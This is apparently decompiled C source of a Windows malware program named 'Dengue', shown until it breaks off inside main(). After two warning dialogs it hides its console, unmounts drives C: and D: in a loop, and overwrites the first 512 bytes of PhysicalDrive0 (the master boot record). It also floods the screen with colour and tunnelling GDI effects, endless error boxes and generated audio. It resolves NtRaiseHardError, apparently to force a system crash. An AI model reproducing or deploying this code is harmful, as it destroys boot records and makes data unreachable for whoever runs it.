#include <Windows.h>
#include <math.h>

__int64 __fastcall sub_140001000(__int64 a1, int a2)
{
  float v2; // xmm3_4
  float v3; // xmm1_4
  float v4; // xmm6_4
  float v5; // xmm5_4
  float v6; // xmm2_4
  float v7; // xmm0_4
  float v8; // xmm4_4
  float v9; // xmm7_4
  float v10; // xmm1_4

  v2 = (float)(unsigned __int8)a2 / 255.0;
  v3 = (float)BYTE1(a2) / 255.0;
  v4 = (float)BYTE2(a2) / 255.0;
  v5 = fmaxf(fmaxf(v2, v3), v4);
  v6 = fminf(fminf(v2, v3), v4);
  v7 = v5 + v6;
  v8 = v5 - v6;
  v9 = (float)(v5 + v6) * 0.5;
  *(float *)(a1 + 8) = v9;
  if ( (float)(v5 - v6) == 0.0 )
  {
    *(_QWORD *)a1 = 0;
  }
  else
  {
    if ( v9 > 0.5 )
      v7 = (float)(2.0 - v5) - v6;
    *(float *)(a1 + 4) = v8 / v7;
    if ( v2 == v5 )
    {
      v10 = (float)((float)(v3 - v4) / 6.0) / v8;
    }
    else if ( v3 == v5 )
    {
      v10 = (float)((float)((float)(v4 - v2) / 6.0) / v8) + 0.33333334;
    }
    else
    {
      v10 = (float)((float)((float)(v2 - v3) / 6.0) / v8) + 0.66666669;
    }
    if ( v10 < 0.0 )
      v10 = v10 + 1.0;
    if ( v10 > 1.0 )
      v10 = v10 + -1.0;
    *(_DWORD *)a1 = (int)(float)(v10 * 360.0);
  }
  return a1;
}
__int64 __fastcall sub_140001170(__int64 a1)
{
  float v1; // xmm2_4
  float v2; // xmm5_4
  float v3; // xmm1_4
  float v4; // xmm2_4
  float v5; // xmm3_4
  float v6; // xmm4_4
  float v7; // xmm1_4
  float v8; // xmm3_4
  float v9; // xmm7_4
  float v10; // xmm4_4

  v1 = *(float *)(a1 + 4);
  if ( v1 == 0.0 )
  {
    v2 = *(float *)(a1 + 8);
    v3 = v2;
    v4 = v2;
  }
  else
  {
    v5 = *(float *)(a1 + 8);
    v6 = (float)*(int *)a1 / 360.0;
    if ( v5 >= 0.5 )
      v4 = (float)(v5 + v1) - (float)(v5 * v1);
    else
      v4 = (float)(v1 + 1.0) * v5;
    v7 = v6 + 0.33333334;
    v8 = (float)(v5 + v5) - v4;
    if ( (float)(v6 + 0.33333334) < 0.0 )
      v7 = v7 + 1.0;
    if ( v7 > 1.0 )
      v7 = v7 + -1.0;
    if ( (float)(v7 * 6.0) >= 1.0 )
    {
      if ( (float)(v7 + v7) >= 1.0 )
      {
        if ( (float)(v7 * 3.0) >= 2.0 )
          v2 = v8;
        else
          v2 = (float)((float)((float)(v4 - v8) * (float)(0.66666669 - v7)) * 6.0) + v8;
      }
      else
      {
        v2 = v4;
      }
    }
    else
    {
      v2 = (float)((float)((float)(v4 - v8) * 6.0) * v7) + v8;
    }
    v9 = (float)*(int *)a1 / 360.0;
    if ( v6 < 0.0 )
      v9 = v6 + 1.0;
    if ( v9 > 1.0 )
      v9 = v9 + -1.0;
    if ( (float)(v9 * 6.0) >= 1.0 )
    {
      if ( (float)(v9 + v9) >= 1.0 )
      {
        if ( (float)(v9 * 3.0) >= 2.0 )
          v3 = v8;
        else
          v3 = (float)((float)((float)(v4 - v8) * (float)(0.66666669 - v9)) * 6.0) + v8;
      }
      else
      {
        v3 = v4;
      }
    }
    else
    {
      v3 = (float)((float)((float)(v4 - v8) * 6.0) * v9) + v8;
    }
    v10 = v6 - 0.33333334;
    if ( v10 < 0.0 )
      v10 = v10 + 1.0;
    if ( v10 > 1.0 )
      v10 = v10 + -1.0;
    if ( (float)(v10 * 6.0) >= 1.0 )
    {
      if ( (float)(v10 + v10) >= 1.0 )
      {
        if ( (float)(v10 * 3.0) >= 2.0 )
          v4 = v8;
        else
          v4 = (float)((float)((float)(v4 - v8) * (float)(0.66666669 - v10)) * 6.0) + v8;
      }
    }
    else
    {
      v4 = (float)((float)((float)(v4 - v8) * 6.0) * v10) + v8;
    }
  }
  return (unsigned __int8)(int)(float)(v2 * 255.0) | ((unsigned __int8)(int)(float)(v4 * 255.0) << 16) | ((unsigned __int8)(int)(float)(v3 * 255.0) << 8);
}
void __fastcall __noreturn sub_140001400(LPVOID lpThreadParameter)
{
  HDC DC; // rbx
  int SystemMetrics; // esi
  int v3; // ebp
  HDC CompatibleDC; // r14
  HBITMAP v5; // rax
  __int64 v6; // rdi
  HDC v7; // rbx
  __int64 i; // r9
  __int64 v9; // rax
  __int64 v10; // rdx
  int v11; // eax
  __int64 v12; // r8
  __int64 v13; // r9
  __int64 v14; // [rsp+50h] [rbp-88h]
  __int64 v15; // [rsp+60h] [rbp-78h] BYREF
  int v16; // [rsp+68h] [rbp-70h]
  char v17[16]; // [rsp+70h] [rbp-68h] BYREF
  void *ppvBits; // [rsp+80h] [rbp-58h] BYREF
  BITMAPINFO pbmi; // [rsp+88h] [rbp-50h] BYREF

  DC = GetDC(0);
  SystemMetrics = GetSystemMetrics(0);
  pbmi.bmiHeader.biSize = 40;
  v3 = GetSystemMetrics(1);
  pbmi.bmiHeader.biWidth = SystemMetrics;
  pbmi.bmiHeader.biHeight = v3;
  ppvBits = 0;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153;
  CompatibleDC = CreateCompatibleDC(DC);
  v5 = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0, 0);
  SelectObject(CompatibleDC, v5);
  v6 = SystemMetrics * v3;
  while ( 1 )
  {
    v7 = GetDC(0);
    BitBlt(CompatibleDC, 0, 0, SystemMetrics, v3, v7, 0, 0, 0xCC0020u);
    for ( i = 0; i < v6; i = v13 + 1 )
    {
      v9 = sub_140001000((__int64)v17, *((_DWORD *)ppvBits + i));
      v14 = *(_QWORD *)v9;
      LODWORD(v14) = *(_QWORD *)v9 + 10;
      v16 = *(_DWORD *)(v9 + 8);
      v15 = v14;
      v11 = sub_140001170(&v15, v10);
      *(_DWORD *)(v12 + 4 * v13) = v11;
    }
    BitBlt(v7, 0, 0, SystemMetrics, v3, CompatibleDC, 0, 0, 0xCC0020u);
    DeleteDC(v7);
  }
}
void __fastcall __noreturn sub_1400015B0(LPVOID lpThreadParameter)
{
  HDC DC; // rbx
  int SystemMetrics; // ebp
  int v3; // edi
  HDC CompatibleDC; // r14
  HBITMAP v5; // rax
  int v6; // esi
  HWND ConsoleWindow; // rax
  HDC v8; // rbx
  __int64 v9; // r10
  __int64 v10; // rax
  __int64 v11; // xmm0_8
  int v12; // er11
  __int64 v13; // rdx
  int v14; // eax
  int v15; // er11
  __int64 v16; // r9
  __int64 v17; // r10
  __int64 v18; // [rsp+50h] [rbp-88h]
  __int64 v19; // [rsp+60h] [rbp-78h] BYREF
  int v20; // [rsp+68h] [rbp-70h]
  char v21[16]; // [rsp+70h] [rbp-68h] BYREF
  void *ppvBits; // [rsp+80h] [rbp-58h] BYREF
  BITMAPINFO pbmi; // [rsp+88h] [rbp-50h] BYREF

  DC = GetDC(0);
  SystemMetrics = GetSystemMetrics(0);
  pbmi.bmiHeader.biSize = 40;
  v3 = GetSystemMetrics(1);
  pbmi.bmiHeader.biWidth = SystemMetrics;
  pbmi.bmiHeader.biHeight = v3;
  ppvBits = 0;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153;
  CompatibleDC = CreateCompatibleDC(DC);
  v5 = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0, 0);
  SelectObject(CompatibleDC, v5);
  v6 = SystemMetrics * v3;
  while ( 1 )
  {
    ConsoleWindow = GetConsoleWindow();
    ShowWindow(ConsoleWindow, 0);
    v8 = GetDC(0);
    BitBlt(CompatibleDC, 0, 0, SystemMetrics, v3, v8, 0, 0, 0xCC0020u);
    if ( v6 > 4 )
    {
      v9 = 16;
      do
      {
        v10 = sub_140001000(v21, *(unsigned int *)((char *)ppvBits + v9));
        v11 = *(_QWORD *)v10;
        v13 = (unsigned int)(v12 >> 31);
        HIDWORD(v18) = HIDWORD(*(_QWORD *)v10);
        LODWORD(v13) = v12 % v3;
        v20 = *(_DWORD *)(v10 + 8);
        LODWORD(v18) = v11 - ((unsigned __int16)(5 * (v12 / v3)) >> 8);
        v19 = v18;
        v14 = sub_140001170(&v19, v13);
        *(_DWORD *)(v17 + v16) = v14;
        v9 = v17 + 4;
      }
      while ( v15 + 1 < v6 );
    }
    Sleep(1u);
    BitBlt(v8, 0, 0, SystemMetrics, v3, CompatibleDC, 0, 0, 0xCC0020u);
    DeleteDC(v8);
  }
}
void __fastcall __noreturn sub_1400017B0(LPVOID lpThreadParameter)
{
  while ( 1 )
    MessageBoxW(0, &Text, &Caption, 0x10u);
}
__int64 __fastcall sub_1400017E0(LPVOID lpThreadParameter)
{
  __int64 v1; // rsi
  HDC hdcSrc; // rdi
  HBRUSH SolidBrush; // rax
  int cy; // ebx
  int SystemMetrics; // eax

  v1 = 1000;
  do
  {
    hdcSrc = GetDC(0);
    rand();
    rand();
    rand();
    SolidBrush = CreateSolidBrush(0);
    SelectObject(hdcSrc, SolidBrush);
    cy = GetSystemMetrics(1);
    SystemMetrics = GetSystemMetrics(0);
    BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x5A0049u);
    ReleaseDC(0, hdcSrc);
    --v1;
  }
  while ( v1 );
  return 1;
}
void __fastcall __noreturn sub_1400018A0(LPVOID lpThreadParameter)
{
  HWND DesktopWindow; // rax
  int cy; // er15
  int v3; // ebx
  int v4; // edi
  double v5; // xmm7_8
  double v6; // xmm6_8
  double v7; // xmm6_8
  int v8; // ebp
  int v9; // eax
  int y1; // er13
  int v11; // ebx
  int v12; // er14
  int v13; // er12
  int x1; // edi
  HDC hdcSrc; // rsi
  HRGN EllipticRgn; // rbx
  HDC DC; // rdi
  HRGN v18; // rbx
  HDC v19; // rsi
  HRGN v20; // rbx
  int v21; // [rsp+50h] [rbp-78h]
  int x; // [rsp+5Ch] [rbp-6Ch]
  int v23; // [rsp+60h] [rbp-68h]
  struct tagRECT Rect; // [rsp+68h] [rbp-60h] BYREF

  DesktopWindow = GetDesktopWindow();
  GetWindowRect(DesktopWindow, &Rect);
  cy = Rect.bottom - Rect.top - 1000;
  v3 = Rect.right - Rect.top + 245;
  v23 = v3;
  v4 = cy + 500;
  v5 = sin(12.0);
  v6 = tan((double)(cy - 54));
  x = (int)(v6 + sin(24.0));
  v7 = sin(33.0);
  while ( 1 )
  {
    v8 = rand() % v3 - 250;
    v9 = rand();
    y1 = v9 % v4 + v8 + 12;
    v11 = 4;
    v12 = -13 - v8;
    v21 = 4;
    v13 = (int)(v7 - sin((double)(v9 % v4 + 23)));
    do
    {
      RedrawWindow(0, 0, 0, 0x85u);
      x1 = (int)(v5 - cos((double)v11));
      hdcSrc = GetDC(0);
      EllipticRgn = CreateEllipticRgn(x1, y1, x1 + v8, cy + y1);
      SelectClipRgn(hdcSrc, EllipticRgn);
      BitBlt(hdcSrc, x1, y1, v8, cy, hdcSrc, x1, y1, 0x5A0049u);
      DeleteObject(EllipticRgn);
      ReleaseDC(0, hdcSrc);
      DC = GetDC(0);
      v18 = CreateEllipticRgn(x, v12, cy + x, v12 + v8);
      SelectClipRgn(DC, v18);
      BitBlt(DC, x, v12, cy, v8, DC, x, v12, 0x5A0049u);
      DeleteObject(v18);
      ReleaseDC(0, DC);
      LODWORD(DC) = v12 + v8 + 13;
      v19 = GetDC(0);
      v20 = CreateEllipticRgn(v13, -13, (int)DC + v13, v8 - 13);
      SelectClipRgn(v19, v20);
      BitBlt(v19, v13, -13, (int)DC, v8, v19, v13, -13, 0x5A0049u);
      DeleteObject(v20);
      ReleaseDC(0, v19);
      Sleep(0x19u);
      v12 += 100;
      v11 = v21 - 100;
      v21 -= 100;
    }
    while ( v12 + v8 + 13 < 500 );
    v3 = v23;
    v4 = cy + 500;
  }
}

void __fastcall __noreturn sub_140001B90(LPVOID lpThreadParameter)
{
  HWND DesktopWindow; // rax
  int cy; // ebx
  int v3; // edi
  int y1; // er12
  int v5; // eax
  int v6; // edi
  int v7; // er13
  int v8; // ebp
  int x1; // er15
  int v10; // er14
  HDC hdcSrc; // rsi
  HRGN EllipticRgn; // rdi
  int v13; // er14
  HDC DC; // rsi
  HRGN v15; // rdi
  HDC v16; // rsi
  HRGN v17; // rdi
  int x; // [rsp+50h] [rbp-58h]
  int i; // [rsp+58h] [rbp-50h]
  struct tagRECT Rect; // [rsp+60h] [rbp-48h] BYREF

  DesktopWindow = GetDesktopWindow();
  GetWindowRect(DesktopWindow, &Rect);
  cy = Rect.bottom - Rect.top - 500;
  v3 = Rect.right - Rect.top + 500;
  for ( i = v3; ; v3 = i )
  {
    y1 = rand() % v3 - 500;
    v5 = rand();
    v6 = y1 + cy;
    v7 = cy * (v5 % (cy + 1000));
    v8 = v5 % (cy + 1000) - 2;
    x1 = y1 * v8;
    v10 = -(y1 * v8);
    x = cy * v8;
    do
    {
      hdcSrc = GetDC(0);
      EllipticRgn = CreateEllipticRgn(x1, y1, x1 - 5, v6);
      SelectClipRgn(hdcSrc, EllipticRgn);
      BitBlt(hdcSrc, x1, y1, -5, cy, hdcSrc, x1, y1, 0x5A0049u);
      DeleteObject(EllipticRgn);
      ReleaseDC(0, hdcSrc);
      v13 = (x1 + v10) * (x1 + v10) - y1;
      DC = GetDC(0);
      v15 = CreateEllipticRgn(v13, 2 * cy - 5, v13 + cy, cy + 2 * cy - 5);
      SelectClipRgn(DC, v15);
      BitBlt(DC, v13, 2 * cy - 5, cy, cy, DC, v13, 2 * cy - 5, 0x5A0049u);
      DeleteObject(v15);
      ReleaseDC(0, DC);
      v16 = GetDC(0);
      v17 = CreateEllipticRgn(x, v8, v7, cy + v8);
      SelectClipRgn(v16, v17);
      BitBlt(v16, x, v8, 2 * cy, cy, v16, x, v8, 0x5A0049u);
      DeleteObject(v17);
      ReleaseDC(0, v16);
      Sleep(1u);
      v10 = -(y1 * v8);
      v6 = y1 + cy;
      x1 += 100;
    }
    while ( x1 - y1 * v8 < 1000 );
  }
}
void __fastcall __noreturn sub_140001DE0(LPVOID lpThreadParameter)
{
  int wSrc; // ebp
  int hSrc; // er14
  HDC hdcSrc; // rsi
  int i; // edi
  int v5; // ebx
  double v6; // xmm0_8

  GetDC(0);
  wSrc = GetSystemMetrics(0);
  hSrc = GetSystemMetrics(1);
  while ( 1 )
  {
    hdcSrc = GetDC(0);
    for ( i = 0; i < 1444; i += 100 )
    {
      v5 = (int)(cos((double)i) * 35.0);
      v6 = sin((double)i);
      StretchBlt(
        hdcSrc,
        v5,
        (int)(v6 * 35.0),
        wSrc - 2 * v5,
        hSrc - 2 * (int)(v6 * 35.0),
        hdcSrc,
        0,
        0,
        wSrc,
        hSrc,
        0xCC0020u);
      Sleep(0x32u);
    }
  }
}
void __fastcall __noreturn sub_140001ED0(LPVOID lpThreadParameter)
{
  HDC DC; // rbx
  int SystemMetrics; // esi
  int v3; // ebp
  HDC CompatibleDC; // r15
  HBITMAP v5; // rax
  int v6; // er14
  HWND ConsoleWindow; // rax
  HDC v8; // rdi
  __int64 v9; // rbx
  __int64 v10; // rax
  __int64 v11; // xmm0_8
  int v12; // er11
  int v13; // eax
  int v14; // er11
  __int64 v15; // r10
  __int64 v16; // [rsp+50h] [rbp-88h]
  __int64 v17; // [rsp+60h] [rbp-78h] BYREF
  int v18; // [rsp+68h] [rbp-70h]
  char v19[16]; // [rsp+70h] [rbp-68h] BYREF
  void *ppvBits; // [rsp+80h] [rbp-58h] BYREF
  BITMAPINFO pbmi; // [rsp+88h] [rbp-50h] BYREF

  DC = GetDC(0);
  SystemMetrics = GetSystemMetrics(0);
  pbmi.bmiHeader.biSize = 40;
  v3 = GetSystemMetrics(1);
  pbmi.bmiHeader.biWidth = SystemMetrics;
  pbmi.bmiHeader.biHeight = v3;
  ppvBits = 0;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153;
  CompatibleDC = CreateCompatibleDC(DC);
  v5 = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0, 0);
  SelectObject(CompatibleDC, v5);
  v6 = SystemMetrics * v3;
  while ( 1 )
  {
    ConsoleWindow = GetConsoleWindow();
    ShowWindow(ConsoleWindow, 0);
    v8 = GetDC(0);
    BitBlt(CompatibleDC, 0, 0, SystemMetrics, v3, v8, 0, 0, 0xCC0020u);
    if ( v6 > 4 )
    {
      v9 = 16;
      do
      {
        v10 = sub_140001000((__int64)v19, *(_DWORD *)((char *)ppvBits + v9));
        v11 = *(_QWORD *)v10;
        HIDWORD(v16) = HIDWORD(*(_QWORD *)v10);
        v18 = *(_DWORD *)(v10 + 8);
        LODWORD(v16) = v11 - ((unsigned __int16)(v12 % SystemMetrics * (v12 / v3)) >> 8);
        v17 = v16;
        v13 = sub_140001170((__int64)&v17);
        *(_DWORD *)(v9 + v15) = v13;
        v9 += 4;
      }
      while ( v14 + 1 < v6 );
    }
    Sleep(0x352u);
    BitBlt(v8, 0, 0, SystemMetrics, v3, CompatibleDC, 0, 0, 0xCC0020u);
    DeleteDC(v8);
  }
}
void __fastcall __noreturn sub_1400020D0(LPVOID lpThreadParameter)
{
  int SystemMetrics; // esi
  __int128 v2; // xmm6
  int cy; // ebp
  HDC hdcSrc; // rdi
  int v5; // ebx
  double v6; // xmm0_8
  __int128 v7; // xmm0

  GetDC(0);
  SystemMetrics = GetSystemMetrics(0);
  v2 = 0;
  cy = GetSystemMetrics(1);
  while ( 1 )
  {
    hdcSrc = GetDC(0);
    v5 = (int)(sin(*(double *)&v2) * 5.0);
    v6 = cos(*(double *)&v2);
    BitBlt(hdcSrc, (int)(v6 * 5.0), v5, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
    *((_QWORD *)&v7 + 1) = *((_QWORD *)&v2 + 1);
    *(double *)&v7 = fmod(*(double *)&v2 + 0.6283185307179586, 15.70796326794897);
    v2 = v7;
    Sleep(0xAu);
  }
}
void __fastcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  HWND ConsoleWindow; // rax

  while ( 1 )
  {
    ConsoleWindow = GetConsoleWindow();
    ShowWindow(ConsoleWindow, 0);
    system("mountvol C: /d");
    system("mountvol D: /d");
  }
}
MMRESULT __fastcall sub_140002200()
{
  signed __int64 v0; // rax
  void *v1; // rsp
  unsigned int v2; // ebx
  char *v3; // rdi
  double v4; // xmm1_8
  int v5; // ecx
  unsigned int v6; // eax
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v11[48000]; // [rsp+80h] [rbp-80h] BYREF

  v1 = alloca(v0);
  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0;
  pwfx.nSamplesPerSec = 8000;
  pwfx.nAvgBytesPerSec = 8000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
  memset(&v11[1], 0, 0xBB7Fu);
  v2 = 0;
  v3 = v11;
  do
  {
    ++v3;
    v4 = sin((double)(v2 >> 8));
    v5 = ((v2 >> 6) & 0x2A) * ((v2 >> 7) & 0x2A);
    v6 = v2++ >> 2;
    *(v3 - 1) = (int)(v4 * (double)(int)(v5 * v6));
  }
  while ( v2 < 0xBB80 );
  pwh.lpData = v11;
  *(_QWORD *)&pwh.dwBufferLength = 48000;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}
MMRESULT __fastcall sub_140002390()
{
  signed __int64 v0; // rax
  void *v1; // rsp
  unsigned int v2; // eax
  char *v3; // r8
  char v4; // cl
  char v5; // dl
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v10[80000]; // [rsp+80h] [rbp-80h] BYREF

  v1 = alloca(v0);
  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0;
  pwfx.nSamplesPerSec = 8000;
  pwfx.nAvgBytesPerSec = 8000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
  memset(&v10[1], 0, 0x1387Fu);
  v2 = 0;
  v3 = v10;
  do
  {
    v4 = v2;
    ++v3;
    v5 = (v2++ >> 10) & 0x17;
    *(v3 - 1) = v4 * v5;
  }
  while ( v2 < 0x13880 );
  pwh.lpData = v10;
  *(_QWORD *)&pwh.dwBufferLength = 80000;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}
MMRESULT __fastcall sub_1400024E0()
{
  signed __int64 v0; // rax
  void *v1; // rsp
  unsigned int v2; // eax
  char *v3; // r8
  char v4; // cl
  char v5; // dl
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v10[96000]; // [rsp+80h] [rbp-80h] BYREF

  v1 = alloca(v0);
  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0;
  pwfx.nSamplesPerSec = 8000;
  pwfx.nAvgBytesPerSec = 8000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
  memset(&v10[1], 0, 0x176FFu);
  v2 = 0;
  v3 = v10;
  do
  {
    ++v3;
    v4 = v2;
    v5 = (v2 >> 6) | (v2 >> 10) | (4 * v2) & (v2 >> 1);
    ++v2;
    *(v3 - 1) = v4 * v5;
  }
  while ( v2 < 0x17700 );
  pwh.lpData = v10;
  *(_QWORD *)&pwh.dwBufferLength = 96000;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}
__int64 __fastcall sub_140002640(LPVOID lpThreadParameter)
{
  HANDLE FileA; // rbx
  DWORD NumberOfBytesWritten; 

  FileA = CreateFileA("\\\\.\\PhysicalDrive0", 0xC0000000, 3u, 0, 3u, 0, 0);
  WriteFile(FileA, &unk_1400045C4, 0x200u, &NumberOfBytesWritten, 0);
  CloseHandle(FileA);
  return 1;
}

__int64 __fastcall sub_140002BE0(__int64 a1)
{
  __int64 v1; // rcx
  __int64 result; // rax

  if ( a1 == _security_cookie )
  {
    v1 = __ROL8__(a1, 16);
    if ( !(_WORD)v1 )
      return result;
    a1 = __ROR8__(v1, 16);
  }
  return sub_140002EA8(a1);
}

BOOL __fastcall _raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  HANDLE CurrentProcess; 

  SetUnhandledExceptionFilter(0);
  UnhandledExceptionFilter(ExceptionInfo);
  CurrentProcess = GetCurrentProcess();
  return TerminateProcess(CurrentProcess, 0xC0000409);
}

BOOL __fastcall sub_140002EA8(DWORD64 a1)
{
  DWORD64 retaddr; 
  DWORD64 v3; 

  v3 = a1;
  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(2u);
  capture_previous_context(&ContextRecord);
  ContextRecord.Rip = retaddr;
  ContextRecord.Rsp = (DWORD64)&v3;
  qword_140006060 = retaddr;
  ContextRecord.Rcx = v3;
  dword_140006050 = -1073740791;
  dword_140006054 = 1;
  dword_140006068 = 1;
  unk_140006070 = 2;
  return _raise_securityfailure((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
}

struct _IMAGE_RUNTIME_FUNCTION_ENTRY *__fastcall capture_previous_context(PCONTEXT ContextRecord)
{
  DWORD64 Rip; // rsi
  int i; // edi
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *result; // rax
  unsigned __int64 ImageBase; // [rsp+60h] [rbp+8h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+68h] [rbp+10h] BYREF
  PVOID HandlerData; // [rsp+70h] [rbp+18h] BYREF

  RtlCaptureContext(ContextRecord);
  Rip = ContextRecord->Rip;
  for ( i = 0; i < 2; ++i )
  {
    result = RtlLookupFunctionEntry(Rip, &ImageBase, 0);
    if ( !result )
      break;
    result = (struct _IMAGE_RUNTIME_FUNCTION_ENTRY *)RtlVirtualUnwind(
                                                       0,
                                                       ImageBase,
                                                       Rip,
                                                       result,
                                                       ContextRecord,
                                                       &HandlerData,
                                                       &EstablisherFrame,
                                                       0);
  }
  return result;
}
_onexit_t __cdecl onexit(_onexit_t Func)
{
  int v2; // eax
  int (__cdecl *v3)();

  if ( Table._first == (_PVFV *)-1 )
    v2 = crt_atexit((_PVFV)Func);
  else
    v2 = register_onexit_function(&Table, Func);
  v3 = 0;
  if ( !v2 )
    return Func;
  return v3;
}
int __cdecl atexit(void (__cdecl *a1)())
{
  return (onexit((_onexit_t)a1) != 0) - 1;
}
void sub_140003300()
{
  InitializeSListHead(&stru_140006610);
}
char sub_140003310()
{
  return 1;
}
void __fastcall sub_140003368(unsigned int a1)
{
  DWORD64 Rip;
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v3; 
  bool v4;
  struct _EXCEPTION_POINTERS ExceptionInfo;
  _QWORD v6[20];
  struct _CONTEXT ContextRecord; 
  DWORD64 retaddr;
  __int64 v9;
  unsigned __int64 ImageBase;
  unsigned __int64 EstablisherFrame;
  PVOID HandlerData;

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(a1);
  sub_140003360();
  memset(&ContextRecord, 0, sizeof(ContextRecord));
  RtlCaptureContext(&ContextRecord);
  Rip = ContextRecord.Rip;
  v3 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, 0);
  if ( v3 )
    RtlVirtualUnwind(0, ImageBase, Rip, v3, &ContextRecord, &HandlerData, &EstablisherFrame, 0);
  ContextRecord.Rip = retaddr;
  ContextRecord.Rsp = (DWORD64)&v9;
  memset(v6, 0, 0x98u);
  v6[2] = retaddr;
  v6[0] = 0x140000015;
  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v6;
  v4 = IsDebuggerPresent();
  ExceptionInfo.ContextRecord = &ContextRecord;
  SetUnhandledExceptionFilter(0);
  if ( !UnhandledExceptionFilter(&ExceptionInfo) && !v4 )
    sub_140003360();
}
void sub_14000357C()
{
  void (**i)(void); // rbx

  for ( i = qword_140004B58; i < qword_140004B58; ++i )
  {
    if ( *i )
      (*i)();
  }
}
void __fastcall sub_1400035B8()
{
  void (**i)(void); // rbx

  for ( i = qword_140004B68; i < qword_140004B68; ++i )
  {
    if ( *i )
      (*i)();
  }
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  HWND ConsoleWindow; // rax
  HANDLE Thread; // rbx
  HANDLE v5; // rbx
  HANDLE v6; // rbx
  HANDLE v7; // rbx
  HANDLE v8; // rbx
  HANDLE v9; // rbx
  HANDLE v10; // rdi
  HANDLE v11; // rbx
  HANDLE v12; // rdi
  HANDLE v13; // rbx
  HMODULE LibraryA; // rax
  HMODULE v15; // rbx
  FARPROC RtlAdjustPrivilege; // rdi
  FARPROC NtRaiseHardError; // rax
  void (__fastcall *v18)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD);
  HANDLE CurrentProcess;
  HANDLE TokenHandle;
  char v22[4];
  char v23[4];
  struct _TOKEN_PRIVILEGES NewState;

  ConsoleWindow = GetConsoleWindow();
  ShowWindow(ConsoleWindow, 0);
  if ( MessageBoxA(
         0,
         "You are about to run a copy of Dengue, This software creates Rainbow Flashes And Ejection.  Press 'Yes' if You "
         "Want to Continue If You Press 'No' otherwise.",
         "Dengue - Warning",
         0x34u) != 6
    || MessageBoxA(
         0,
         "If You Read The First Message shown, Press 'Yes' To Continue. If not, Press 'No'",
         "Dengue  - The Final Warning",
         0x34u) != 6 )
  {
    ExitProcess(0);
  }
  CreateThread(0, 0, StartAddress, 0, 0, 0);
  CreateThread(0, 0, sub_140002640, 0, 0, 0);
  CreateThread(0, 0, sub_1400017B0, 0, 0, 0);
  Sleep(0x2710u);
  Thread = CreateThread(0, 0, sub_1400015B0, 0, 0, 0);
  sub_140002200();
  Sleep(0x1770u);
  TerminateThread(Thread, 0);
  CloseHandle(Thread);
  v5 = CreateThread(0, 0, sub_140001400, 0, 0, 0);
  Sleep(0x1770u);
  TerminateThread(v5, 0);
  CloseHandle(v5);
  v6 = CreateThread(0, 0, sub_1400017E0, 0, 0, 0);
  sub_140002390();
  Sleep(0x2710u);
  TerminateThread(v6, 0);
  CloseHandle(v6);
  v7 = CreateThread(0, 0, sub_1400018A0, 0, 0, 0);
  sub_1400024E0();
  Sleep(0x1964u);
  TerminateThread(v7, 0);
  CloseHandle(v7);
  v8 = CreateThread(0, 0, sub_140001B90, 0, 0, 0);
  Sleep(0x3E8u);
  TerminateThread(v8, 0);
  CloseHandle(v8);
  v9 = CreateThread(0, 0, sub_140001400, 0, 0, 0);
  Sleep(0x1770u);
  TerminateThread(v9, 0);
  CloseHandle(v9);
  v10 = CreateThread(0, 0, sub_140001DE0, 0, 0, 0);
